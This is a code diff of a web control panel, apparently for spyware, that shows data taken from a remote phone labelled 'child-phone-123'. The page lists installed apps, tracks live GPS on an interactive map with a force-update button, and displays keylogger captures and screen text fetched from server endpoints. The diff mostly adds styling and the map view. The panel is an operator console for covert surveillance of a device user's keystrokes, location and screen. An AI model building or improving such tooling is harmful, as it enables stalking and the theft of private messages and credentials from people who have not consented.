@@ -3,53 +3,63 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Device Control</title>
+
+<!-- Leaflet CSS -->
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<!-- Leaflet JS -->
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <style>
 * {
     box-sizing: border-box;
+    margin: 0;
+    padding: 0;
 }
 
 body {
-    margin: 0;
-    background:
-        radial-gradient(circle at top, #241318 0%, #090708 45%, #050505 100%);
+    font-family: 'Inter', 'Poppins', Arial, sans-serif;
+    background: radial-gradient(circle at 30% 20%, #1a0f0f 0%, #0a0808 50%, #050505 100%);
     color: #eee;
-    font-family: Arial, sans-serif;
     min-height: 100vh;
 }
 
 .header {
-    height: 58px;
-    border-bottom: 1px solid #32191d;
+    height: 64px;
+    border-bottom: 1px solid rgba(255, 60, 60, 0.25);
     display: flex;
     align-items: center;
-    padding: 0 15px;
+    padding: 0 20px;
     gap: 10px;
-    background: rgba(10, 7, 8, .92);
+    background: rgba(15, 10, 10, 0.92);
+    backdrop-filter: blur(12px);
+    position: sticky;
+    top: 0;
+    z-index: 20;
 }
 
 .logo {
-    width: 34px;
-    height: 34px;
-    border-radius: 9px;
+    width: 36px;
+    height: 36px;
+    border-radius: 10px;
     background: #ff3338;
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: 17px;
+    font-size: 18px;
+    box-shadow: 0 0 18px rgba(255, 50, 55, 0.35);
 }
 
 .title {
-    font-size: 15px;
+    font-size: 16px;
     font-weight: 700;
+    letter-spacing: 0.5px;
 }
 
 .nav {
     display: flex;
     gap: 8px;
-    margin-left: 8px;
+    margin-left: 10px;
 }
 
 .nav button {
@@ -59,11 +69,14 @@ body {
     padding: 8px 13px;
     border-radius: 9px;
     cursor: pointer;
+    font-size: 11px;
+    transition: all 0.2s;
 }
 
 .nav button:hover {
     color: white;
     border-color: #ff3d42;
+    background: #24181a;
 }
 
 .device-id {
@@ -78,160 +91,231 @@ body {
     padding: 6px 9px;
     border-radius: 15px;
     font-size: 9px;
+    background: rgba(255, 50, 55, 0.05);
+    box-shadow: 0 0 10px rgba(255, 50, 55, 0.2);
 }
 
 .container {
-    padding: 16px;
-    max-width: 1100px;
+    padding: 20px;
+    max-width: 1200px;
     margin: auto;
 }
 
 .device-card {
     border: 1px solid #3b2529;
-    border-radius: 15px;
-    padding: 18px;
-    background: rgba(22, 15, 17, .82);
-    margin-bottom: 14px;
+    border-radius: 18px;
+    padding: 20px;
+    background: rgba(22, 15, 17, 0.82);
+    margin-bottom: 18px;
+    backdrop-filter: blur(8px);
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
 }
 
 .device-name {
-    font-size: 17px;
+    font-size: 18px;
     font-weight: bold;
 }
 
 .device-status {
-    margin-top: 7px;
-    font-size: 11px;
-    color: #777;
+    margin-top: 8px;
+    font-size: 12px;
+    color: #aaa;
 }
 
 .online-dot {
     color: #35c76a;
 }
 
+/* Main Tabs */
 .controls {
     display: flex;
     flex-wrap: wrap;
-    gap: 8px;
-    margin-bottom: 15px;
+    gap: 10px;
+    margin-bottom: 20px;
 }
 
 .control-btn {
     background: transparent;
     color: #aaa;
     border: 0;
-    padding: 7px 8px;
-    font-size: 11px;
+    padding: 10px 16px;
+    font-size: 12px;
     cursor: pointer;
+    border-radius: 30px;
+    transition: all 0.25s;
+    border: 1px solid transparent;
 }
 
 .control-btn:hover {
     color: #fff;
+    background: rgba(255, 50, 55, 0.08);
 }
 
 .control-btn.active {
     background: #ff3439;
     color: white;
-    border-radius: 8px;
-    box-shadow: 0 0 15px rgba(255, 50, 55, .35);
+    border-radius: 30px;
+    box-shadow: 0 0 20px rgba(255, 50, 55, 0.5);
+    border-color: #ff3439;
 }
 
+/* Panels */
 .panel {
     border: 1px solid #3b292d;
-    border-radius: 15px;
-    background: rgba(22, 15, 17, .86);
+    border-radius: 22px;
+    background: rgba(18, 12, 14, 0.9);
     overflow: hidden;
+    margin-bottom: 20px;
+    backdrop-filter: blur(10px);
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
 }
 
 .panel-header {
-    padding: 15px;
-    border-bottom: 1px solid #302125;
+    padding: 20px;
+    border-bottom: 1px solid rgba(255, 50, 55, 0.2);
     display: flex;
     align-items: center;
     justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 15px;
 }
 
 .panel-title {
-    font-size: 13px;
-    font-weight: bold;
+    font-size: 20px;
+    font-weight: 700;
+    letter-spacing: -0.5px;
 }
 
-.refresh {
-    background: #21181a;
-    color: #aaa;
-    border: 1px solid #392327;
-    border-radius: 8px;
-    padding: 7px 11px;
-    cursor: pointer;
-}
-
-.refresh:hover {
-    color: white;
-    border-color: #ff3c42;
-}
-
-.apps {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 9px;
-    padding: 14px;
-}
-
-.app {
-    background: linear-gradient(145deg, #21181b, #161012);
-    border: 1px solid #302126;
-    border-radius: 9px;
-    padding: 13px 11px;
-    min-height: 63px;
-}
-
-.app-name {
+.panel-subtitle {
     font-size: 12px;
-    font-weight: bold;
+    color: #888;
 }
 
-.package {
-    margin-top: 7px;
-    color: #666;
-    font-size: 9px;
-    word-break: break-all;
+.refresh-btn, .force-btn {
+    background: #ff3439;
+    color: white;
+    border: none;
+    border-radius: 30px;
+    padding: 10px 20px;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    box-shadow: 0 0 20px rgba(255, 50, 55, 0.4);
 }
 
-.gps-box {
-    display: none;
-    padding: 18px;
+.refresh-btn:hover, .force-btn:hover {
+    background: #ff4b4f;
+    box-shadow: 0 0 30px rgba(255, 50, 55, 0.7);
+    transform: translateY(-1px);
 }
 
-.gps-status {
-    background: #181214;
-    border: 1px solid #342326;
-    border-radius: 10px;
-    padding: 17px;
+.refresh-btn:disabled, .force-btn:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+    transform: none;
 }
 
-.gps-label {
-    color: #777;
+/* GPS Stat Cards */
+.gps-stats {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 16px;
+    padding: 20px;
+}
+
+.stat-card {
+    background: linear-gradient(145deg, #1e1416, #141012);
+    border: 1px solid #2d1d20;
+    border-radius: 18px;
+    padding: 20px 18px;
+    min-height: 100px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    transition: transform 0.2s, box-shadow 0.2s;
+    backdrop-filter: blur(8px);
+}
+
+.stat-card:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 10px 25px rgba(255, 50, 55, 0.15);
+}
+
+.stat-label {
     font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: #aaa;
+    margin-bottom: 8px;
 }
 
-.gps-value {
-    margin-top: 8px;
-    font-size: 13px;
-    color: #ddd;
+.stat-value {
+    font-size: 24px;
+    font-weight: 700;
+    color: #fff;
 }
 
-.demo-note {
-    margin-top: 12px;
-    color: #666;
-    font-size: 10px;
+.stat-value.green {
+    color: #35c76a;
 }
 
+/* Map Container */
+.map-container {
+    margin: 0 20px 20px 20px;
+    border-radius: 20px;
+    overflow: hidden;
+    border: 1px solid rgba(255, 50, 55, 0.3);
+    height: 500px;
+    position: relative;
+}
+
+#map {
+    width: 100%;
+    height: 100%;
+    background: #0d0d0d;
+}
+
+.map-overlay {
+    position: absolute;
+    bottom: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(20, 12, 14, 0.9);
+    border: 1px solid #ff3d42;
+    border-radius: 30px;
+    padding: 10px 20px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 12px;
+    color: #fff;
+    z-index: 500;
+    backdrop-filter: blur(8px);
+    box-shadow: 0 0 15px rgba(255, 50, 55, 0.3);
+    transition: all 0.3s;
+}
+
+.spinner {
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: #ff3439;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* Keylogger and Screen Data sections */
 .keylog-box, .screen-box {
     background: #181214;
     border: 1px solid #342326;
-    border-radius: 10px;
+    border-radius: 12px;
     padding: 17px;
-    margin-top: 12px;
+    margin: 20px;
 }
 
 .keylog-entry {
@@ -254,23 +338,81 @@ body {
     color: #ccc;
 }
 
-@media(max-width:700px) {
+/* Installed Apps */
+.apps {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+    padding: 20px;
+}
+
+.app {
+    background: linear-gradient(145deg, #21181b, #161012);
+    border: 1px solid #302126;
+    border-radius: 10px;
+    padding: 14px 12px;
+    min-height: 60px;
+}
+
+.app-name {
+    font-size: 12px;
+    font-weight: bold;
+}
+
+.package {
+    margin-top: 6px;
+    color: #666;
+    font-size: 9px;
+    word-break: break-all;
+}
+
+/* Responsive */
+@media(max-width: 900px) {
+    .gps-stats {
+        grid-template-columns: repeat(2, 1fr);
+    }
     .apps {
         grid-template-columns: repeat(2, 1fr);
     }
-
-    .device-id {
-        display: none;
-    }
 }
 
-@media(max-width:430px) {
-    .apps {
-        grid-template-columns: 1fr;
+@media(max-width: 600px) {
+    .header {
+        flex-wrap: wrap;
+        height: auto;
+        padding: 10px;
     }
-
     .nav {
-        display: none;
+        overflow-x: auto;
+        width: 100%;
+        order: 3;
+    }
+    .device-id {
+        margin-left: auto;
+    }
+    .container {
+        padding: 10px;
+    }
+    .gps-stats {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 10px;
+    }
+    .map-container {
+        height: 350px;
+        margin: 0 10px 10px 10px;
+    }
+    .controls {
+        gap: 6px;
+        overflow-x: auto;
+        flex-wrap: nowrap;
+    }
+    .control-btn {
+        padding: 8px 12px;
+        white-space: nowrap;
+    }
+    .panel-header {
+        flex-direction: column;
+        align-items: flex-start;
     }
 }
 </style>
@@ -279,177 +421,121 @@ body {
 <body>
 
 <header class="header">
-
     <div class="logo">⌁</div>
-
-    <div class="title">OBEY-ME</div>
-
+    <div class="title">NEON PANEL</div>
     <div class="nav">
         <button onclick="location.href='/dashboard'">⌂ Home</button>
         <button onclick="location.href='/dashboard'">← Dashboard</button>
     </div>
-
     <div class="device-id" id="deviceIdDisplay">
         DEVICE ID: <b>child-phone-123</b>
     </div>
-
     <div class="live">● LIVE LINK</div>
-
 </header>
-
 
 <main class="container">
 
+    <!-- Device Info Card -->
     <section class="device-card">
-
         <div class="device-name" id="deviceName">📱 Loading...</div>
-
         <div class="device-status">
             <span class="online-dot">●</span>
             <span id="deviceStatusText">Loading...</span>
             &nbsp; • &nbsp; Battery <span id="batteryLevel">—</span>%
         </div>
-
     </section>
 
-
-    <!-- CONTROL BUTTONS -->
-
+    <!-- Main Tabs -->
     <div class="controls">
-
-        <button class="control-btn active"
-                onclick="showApps(this)">
-            ▦ Installed Apps
-        </button>
-
-        <button class="control-btn"
-                onclick="showGPS(this)">
-            📍 GPS Tracker
-        </button>
-
-        <button class="control-btn"
-                onclick="showKeylog(this)">
-            ⌨ Keylogger
-        </button>
-
-        <button class="control-btn"
-                onclick="showScreenData(this)">
-            🖥 Screen Data
-        </button>
-
+        <button class="control-btn" onclick="showApps(this)">▦ Installed Apps</button>
+        <button class="control-btn active" onclick="showGPS(this)">📍 GPS Tracker</button>
+        <button class="control-btn" onclick="showKeylog(this)">⌨ Keylogger</button>
+        <button class="control-btn" onclick="showScreenData(this)">🖥 Screen Data</button>
     </div>
 
-
-    <!-- INSTALLED APPS -->
-
-    <section class="panel" id="appsPanel">
-
+    <!-- GPS Tracker Panel -->
+    <section class="panel" id="gpsPanel">
         <div class="panel-header">
-
-            <div class="panel-title">
-                ▦ Installed Packages & Applications
+            <div>
+                <div class="panel-title">📍 Live GPS Location Tracker</div>
+                <div class="panel-subtitle">Real-time GPS coordinates and live interactive map explorer.</div>
             </div>
-
-            <button class="refresh" onclick="loadDeviceInfo()">
-                ⟳ Fetch Apps
+            <button class="force-btn" id="forceGpsBtn" onclick="forceGpsUpdate()">
+                ➤ Force GPS Update
             </button>
-
         </div>
 
-        <div class="apps" id="installedAppsList">
-            Loading apps...
+        <!-- Four Stat Cards -->
+        <div class="gps-stats">
+            <div class="stat-card">
+                <div class="stat-label">LATITUDE</div>
+                <div class="stat-value" id="latValue">--.-------</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">LONGITUDE</div>
+                <div class="stat-value" id="lngValue">--.-------</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">ACCURACY</div>
+                <div class="stat-value green" id="accuracyValue">-- m</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">LAST UPDATE</div>
+                <div class="stat-value" id="lastUpdateValue">Never</div>
+            </div>
         </div>
 
+        <!-- Map Container -->
+        <div class="map-container">
+            <div id="map"></div>
+            <div class="map-overlay" id="mapOverlay" style="display:none;">
+                <div class="spinner"></div>
+                <span id="mapOverlayText">Requesting GPS location...</span>
+            </div>
+        </div>
     </section>
 
-
-    <!-- GPS PANEL (Real Data) -->
-
-    <section class="panel gps-box" id="gpsPanel">
-
+    <!-- Installed Apps Panel -->
+    <section class="panel" id="appsPanel" style="display:none;">
         <div class="panel-header">
-
-            <div class="panel-title">
-                📍 GPS Tracker
-            </div>
-
-            <button class="refresh" onclick="loadDeviceInfo()">
-                ⟳ Refresh
-            </button>
-
+            <div class="panel-title">▦ Installed Packages & Applications</div>
+            <button class="refresh-btn" onclick="loadDeviceInfo()">⟳ Fetch Apps</button>
         </div>
-
-        <div class="gps-status">
-
-            <div class="gps-label">
-                LOCATION STATUS
-            </div>
-
-            <div class="gps-value" id="gpsValue">
-                No location data yet.
-            </div>
-
-            <div class="demo-note" id="gpsNote">
-                Waiting for device location...
-            </div>
-
-        </div>
-
+        <div class="apps" id="installedAppsList">Loading apps...</div>
     </section>
 
-
-    <!-- KEYLOGGER PANEL -->
-
+    <!-- Keylogger Panel -->
     <section class="panel" id="keylogPanel" style="display:none;">
-
         <div class="panel-header">
-
-            <div class="panel-title">
-                ⌨ Keylogger
-            </div>
-
-            <button class="refresh" onclick="refreshKeylog()">
-                ⟳ Refresh
-            </button>
-
+            <div class="panel-title">⌨ Keylogger</div>
+            <button class="refresh-btn" onclick="refreshKeylog()">⟳ Refresh</button>
         </div>
-
-        <div class="keylog-box" id="keylogContent">
-            Loading keylogs...
-        </div>
-
+        <div class="keylog-box" id="keylogContent">Loading keylogs...</div>
     </section>
 
-
-    <!-- SCREEN DATA PANEL -->
-
+    <!-- Screen Data Panel -->
     <section class="panel" id="screenPanel" style="display:none;">
-
         <div class="panel-header">
-
-            <div class="panel-title">
-                🖥 Screen Data
-            </div>
-
-            <button class="refresh" onclick="refreshScreenData()">
-                ⟳ Refresh
-            </button>
-
+            <div class="panel-title">🖥 Screen Data</div>
+            <button class="refresh-btn" onclick="refreshScreenData()">⟳ Refresh</button>
         </div>
-
         <div class="screen-box">
-            <div class="screen-text" id="screenTextContent">
-                Loading screen data...
-            </div>
+            <div class="screen-text" id="screenTextContent">Loading screen data...</div>
         </div>
-
     </section>
 
 </main>
 
-
 <script>
 
+// ================== CONFIG ==================
+const DEFAULT_CENTER = [23.8103, 90.4125]; // Dhaka, Bangladesh
+const DEFAULT_ZOOM = 13;
+let map;
+let marker = null; // IMPORTANT: no marker initially
+let currentDeviceId = getDeviceId();
+
+// ================== UTILITY ==================
 function getDeviceId() {
     const params = new URLSearchParams(window.location.search);
     return params.get("deviceId") || "child-phone-123";
@@ -464,136 +550,225 @@ function escapeHtml(value) {
         .replaceAll("'", "&#039;");
 }
 
-function showApps(button) {
-    document.querySelectorAll(".control-btn")
-        .forEach(btn => btn.classList.remove("active"));
-    button.classList.add("active");
-
-    document.getElementById("appsPanel").style.display = "block";
-    document.getElementById("gpsPanel").style.display = "none";
-    document.getElementById("keylogPanel").style.display = "none";
-    document.getElementById("screenPanel").style.display = "none";
-
-    loadDeviceInfo();
+// ================== LOCALSTORAGE HELPERS ==================
+function getLastKnownLocation(deviceId) {
+    const key = "lastGpsLocation_" + deviceId;
+    const stored = localStorage.getItem(key);
+    if (stored) {
+        try {
+            return JSON.parse(stored);
+        } catch (e) {
+            return null;
+        }
+    }
+    return null;
 }
 
-function showGPS(button) {
-    document.querySelectorAll(".control-btn")
-        .forEach(btn => btn.classList.remove("active"));
-    button.classList.add("active");
-
-    document.getElementById("appsPanel").style.display = "none";
-    document.getElementById("gpsPanel").style.display = "block";
-    document.getElementById("keylogPanel").style.display = "none";
-    document.getElementById("screenPanel").style.display = "none";
-
-    loadDeviceInfo();
+function saveLastKnownLocation(deviceId, location) {
+    const key = "lastGpsLocation_" + deviceId;
+    localStorage.setItem(key, JSON.stringify(location));
 }
 
-function showKeylog(button) {
-    document.querySelectorAll(".control-btn")
-        .forEach(btn => btn.classList.remove("active"));
-    button.classList.add("active");
+// ================== MAP INIT ==================
+function initMap() {
+    if (map) return;
+    map = L.map('map', {
+        center: DEFAULT_CENTER,
+        zoom: DEFAULT_ZOOM,
+        zoomControl: true
+    });
 
-    document.getElementById("appsPanel").style.display = "none";
-    document.getElementById("gpsPanel").style.display = "none";
-    document.getElementById("keylogPanel").style.display = "block";
-    document.getElementById("screenPanel").style.display = "none";
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; OpenStreetMap contributors',
+        maxZoom: 19
+    }).addTo(map);
 
-    refreshKeylog();
+    // Note: No marker is added here. Marker will be created only when a valid location is received.
 }
 
-function showScreenData(button) {
-    document.querySelectorAll(".control-btn")
-        .forEach(btn => btn.classList.remove("active"));
-    button.classList.add("active");
+// ================== MARKER HELPERS ==================
+function createOrUpdateMarker(lat, lng, popupContent, isFresh = true) {
+    const icon = L.divIcon({
+        className: 'custom-marker',
+        html: '<div style="background:#ff3439; width:14px; height:14px; border-radius:50%; border:2px solid #fff; box-shadow:0 0 10px #ff3439;"></div>',
+        iconSize: [18, 18],
+        iconAnchor: [9, 9]
+    });
 
-    document.getElementById("appsPanel").style.display = "none";
-    document.getElementById("gpsPanel").style.display = "none";
-    document.getElementById("keylogPanel").style.display = "none";
-    document.getElementById("screenPanel").style.display = "block";
-
-    refreshScreenData();
+    if (!marker) {
+        marker = L.marker([lat, lng], { icon }).addTo(map);
+    } else {
+        marker.setLatLng([lat, lng]);
+        marker.setIcon(icon);
+    }
+    marker.bindPopup(popupContent).openPopup();
 }
 
-// Load device info (including GPS)
-async function loadDeviceInfo() {
+function removeMarker() {
+    if (marker) {
+        map.removeLayer(marker);
+        marker = null;
+    }
+}
+
+// ================== OVERLAY HELPERS ==================
+function showOverlayWithSpinner(text) {
+    const overlay = document.getElementById("mapOverlay");
+    const textEl = document.getElementById("mapOverlayText");
+    if (overlay && textEl) {
+        overlay.innerHTML = `<div class="spinner"></div><span>${text}</span>`;
+        overlay.style.display = "flex";
+        overlay.style.borderColor = "#ff3d42";
+    }
+}
+
+function showOverlayText(text) {
+    const overlay = document.getElementById("mapOverlay");
+    const textEl = document.getElementById("mapOverlayText");
+    if (overlay && textEl) {
+        overlay.innerHTML = `<span>${text}</span>`;
+        overlay.style.display = "flex";
+        overlay.style.borderColor = "#ff3d42";
+    }
+}
+
+function hideOverlay() {
+    const overlay = document.getElementById("mapOverlay");
+    if (overlay) overlay.style.display = "none";
+}
+
+// ================== DATA FETCH ==================
+async function loadDeviceInfo(showLoadingOverlay = false) {
     const deviceId = getDeviceId();
     document.getElementById("deviceIdDisplay").innerHTML = `DEVICE ID: <b>${escapeHtml(deviceId)}</b>`;
+
+    if (showLoadingOverlay) {
+        showOverlayWithSpinner("Requesting GPS location...");
+    }
 
     try {
         const response = await fetch(`/api/device-state?deviceId=${deviceId}`);
         if (!response.ok) throw new Error("Failed to fetch device state");
         const data = await response.json();
 
-        document.getElementById("deviceName").textContent =
-            "📱 " + (data.deviceName || "Unknown Device");
+        // Update device info
+        document.getElementById("deviceName").textContent = "📱 " + (data.deviceName || "Unknown Device");
+        document.getElementById("batteryLevel").textContent = data.battery ?? 0;
 
-        document.getElementById("batteryLevel").textContent =
-            data.battery ?? 0;
-
-        if (data.last_seen && Date.now() - data.last_seen < 120000) {
-            document.getElementById("deviceStatusText").textContent = "Online";
-            document.getElementById("deviceStatusText").className = "online-dot";
-        } else {
-            document.getElementById("deviceStatusText").textContent = "Offline";
-            document.getElementById("deviceStatusText").className = "";
-        }
+        const isOnline = data.last_seen && Date.now() - data.last_seen < 120000;
+        document.getElementById("deviceStatusText").textContent = isOnline ? "Online" : "Offline";
+        document.getElementById("deviceStatusText").className = isOnline ? "online-dot" : "";
 
         // Render installed apps
-        renderInstalledApps(data.installedApps || []);
-
-        // Update GPS
-        if (data.latitude && data.longitude) {
-            document.getElementById("gpsValue").innerHTML =
-                `Latitude: ${data.latitude.toFixed(6)}<br>Longitude: ${data.longitude.toFixed(6)}`;
-            document.getElementById("gpsNote").textContent =
-                "Location updated at " + new Date(data.last_seen).toLocaleTimeString();
-        } else {
-            document.getElementById("gpsValue").textContent = "No location data yet.";
-            document.getElementById("gpsNote").textContent = "Waiting for device location...";
+        if (document.getElementById("installedAppsList")) {
+            renderInstalledApps(data.installedApps || []);
         }
+
+        // Update GPS data
+        updateGPSData(data);
+
+        hideOverlay();
+        return data;
 
     } catch (e) {
         console.error(e);
         document.getElementById("deviceName").textContent = "📱 Error loading device info";
         document.getElementById("batteryLevel").textContent = "—";
         document.getElementById("deviceStatusText").textContent = "Error";
+        document.getElementById("deviceStatusText").className = "";
         document.getElementById("installedAppsList").innerHTML = `<div class="app">Failed to load apps</div>`;
-        document.getElementById("gpsValue").textContent = "Error loading location.";
-        document.getElementById("gpsNote").textContent = "";
+        hideOverlay();
+        showOverlayText("GPS location unavailable");
+        setTimeout(hideOverlay, 3000);
+        throw e;
     }
 }
 
-function renderInstalledApps(apps) {
-    const container = document.getElementById("installedAppsList");
-    if (apps.length === 0) {
-        container.innerHTML = `<div class="app">No apps found</div>`;
+function updateGPSData(data) {
+    const deviceId = getDeviceId();
+    const lat = data.latitude ?? null;
+    const lng = data.longitude ?? null;
+    const accuracy = data.accuracy ?? null;
+    const timestamp = data.last_seen ? new Date(data.last_seen) : new Date();
+
+    // 1) If new valid coordinates received
+    if (lat !== null && lng !== null) {
+        const locationObj = { latitude: lat, longitude: lng, accuracy: accuracy, timestamp: timestamp.getTime() };
+        saveLastKnownLocation(deviceId, locationObj);
+
+        // Update cards
+        document.getElementById("latValue").textContent = lat.toFixed(6);
+        document.getElementById("lngValue").textContent = lng.toFixed(6);
+        document.getElementById("accuracyValue").textContent = accuracy !== null ? accuracy + " m" : "-- m";
+        document.getElementById("lastUpdateValue").textContent = timestamp.toLocaleTimeString();
+
+        const popupContent = `<b>CURRENT LOCATION</b><br>Latitude: ${lat.toFixed(6)}<br>Longitude: ${lng.toFixed(6)}${accuracy ? `<br>Accuracy: ${accuracy} m` : ''}<br>Updated: ${timestamp.toLocaleTimeString()}`;
+        createOrUpdateMarker(lat, lng, popupContent, true);
+        map.setView([lat, lng], 15);
+        hideOverlay();
         return;
     }
-    container.innerHTML = apps.map(app => `
-        <div class="app">
-            <div class="app-name">${escapeHtml(app.name)}</div>
-            <div class="package">${escapeHtml(app.package)}</div>
-        </div>
-    `).join("");
+
+    // 2) No new location, check last known
+    const lastKnown = getLastKnownLocation(deviceId);
+    if (lastKnown && lastKnown.latitude !== undefined && lastKnown.longitude !== undefined) {
+        // Use last known
+        const latVal = lastKnown.latitude;
+        const lngVal = lastKnown.longitude;
+        const accVal = lastKnown.accuracy ?? null;
+        const lastTime = lastKnown.timestamp ? new Date(lastKnown.timestamp) : new Date();
+
+        document.getElementById("latValue").textContent = latVal.toFixed(6);
+        document.getElementById("lngValue").textContent = lngVal.toFixed(6);
+        document.getElementById("accuracyValue").textContent = accVal !== null ? accVal + " m" : "-- m";
+        document.getElementById("lastUpdateValue").textContent = lastTime.toLocaleTimeString();
+
+        const popupContent = `<b>LAST KNOWN LOCATION</b><br>Latitude: ${latVal.toFixed(6)}<br>Longitude: ${lngVal.toFixed(6)}${accVal !== null ? `<br>Accuracy: ${accVal} m` : ''}<br>Last updated: ${lastTime.toLocaleTimeString()}`;
+        createOrUpdateMarker(latVal, lngVal, popupContent, false);
+        map.setView([latVal, lngVal], 15);
+        showOverlayText("GPS currently unavailable • Showing last known location");
+        return;
+    }
+
+    // 3) No location ever received
+    document.getElementById("latValue").textContent = "--.-------";
+    document.getElementById("lngValue").textContent = "--.-------";
+    document.getElementById("accuracyValue").textContent = "-- m";
+    document.getElementById("lastUpdateValue").textContent = "Never";
+
+    removeMarker(); // Ensure no marker
+    map.setView(DEFAULT_CENTER, DEFAULT_ZOOM);
+    showOverlayText("Waiting for GPS location...");
 }
 
+// ================== FORCE GPS UPDATE ==================
+async function forceGpsUpdate() {
+    const btn = document.getElementById("forceGpsBtn");
+    btn.disabled = true;
+    btn.innerHTML = '⟳ Requesting...';
+    try {
+        await loadDeviceInfo(true);
+    } catch (e) {
+        // error already handled
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = '➤ Force GPS Update';
+    }
+}
+
+// ================== KEYLOGGER & SCREEN DATA ==================
 async function refreshKeylog() {
     const deviceId = getDeviceId();
     const container = document.getElementById("keylogContent");
     container.innerHTML = "Loading...";
-
     try {
         const response = await fetch(`/api/keylog?deviceId=${deviceId}`);
         if (!response.ok) throw new Error("Failed");
         const logs = await response.json();
-
         if (logs.length === 0) {
             container.innerHTML = "No keylogs yet.";
             return;
         }
-
         container.innerHTML = logs.map(log => `
             <div class="keylog-entry">
                 ${escapeHtml(log.text)}
@@ -609,12 +784,10 @@ async function refreshKeylog() {
 async function refreshScreenData() {
     const deviceId = getDeviceId();
     const content = document.getElementById("screenTextContent");
-
     try {
         const response = await fetch(`/api/ui?deviceId=${deviceId}`);
         if (!response.ok) throw new Error("Failed");
         const data = await response.json();
-
         content.textContent = data.uiText || "No screen data yet.";
     } catch (e) {
         console.error(e);
@@ -622,12 +795,74 @@ async function refreshScreenData() {
     }
 }
 
-// Initial load
-loadDeviceInfo();
+// ================== TABS ==================
+function setActiveTab(btn) {
+    document.querySelectorAll(".control-btn").forEach(b => b.classList.remove("active"));
+    btn.classList.add("active");
+}
 
-// Refresh device info every 30 seconds
-setInterval(loadDeviceInfo, 30000);
+function showApps(btn) {
+    setActiveTab(btn);
+    document.getElementById("appsPanel").style.display = "block";
+    document.getElementById("gpsPanel").style.display = "none";
+    document.getElementById("keylogPanel").style.display = "none";
+    document.getElementById("screenPanel").style.display = "none";
+    loadDeviceInfo();
+}
 
+function showGPS(btn) {
+    setActiveTab(btn);
+    document.getElementById("appsPanel").style.display = "none";
+    document.getElementById("gpsPanel").style.display = "block";
+    document.getElementById("keylogPanel").style.display = "none";
+    document.getElementById("screenPanel").style.display = "none";
+    loadDeviceInfo();
+    setTimeout(() => { if (map) map.invalidateSize(); }, 100);
+}
+
+function showKeylog(btn) {
+    setActiveTab(btn);
+    document.getElementById("appsPanel").style.display = "none";
+    document.getElementById("gpsPanel").style.display = "none";
+    document.getElementById("keylogPanel").style.display = "block";
+    document.getElementById("screenPanel").style.display = "none";
+    refreshKeylog();
+}
+
+function showScreenData(btn) {
+    setActiveTab(btn);
+    document.getElementById("appsPanel").style.display = "none";
+    document.getElementById("gpsPanel").style.display = "none";
+    document.getElementById("keylogPanel").style.display = "none";
+    document.getElementById("screenPanel").style.display = "block";
+    refreshScreenData();
+}
+
+function renderInstalledApps(apps) {
+    const container = document.getElementById("installedAppsList");
+    if (!container) return;
+    if (apps.length === 0) {
+        container.innerHTML = `<div class="app">No apps found</div>`;
+        return;
+    }
+    container.innerHTML = apps.map(app => `
+        <div class="app">
+            <div class="app-name">${escapeHtml(app.name)}</div>
+            <div class="package">${escapeHtml(app.package)}</div>
+        </div>
+    `).join("");
+}
+
+// ================== INIT ==================
+function init() {
+    initMap();
+    loadDeviceInfo();
+    setInterval(() => {
+        loadDeviceInfo();
+    }, 30000);
+}
+
+init();
 </script>
 
 </body>
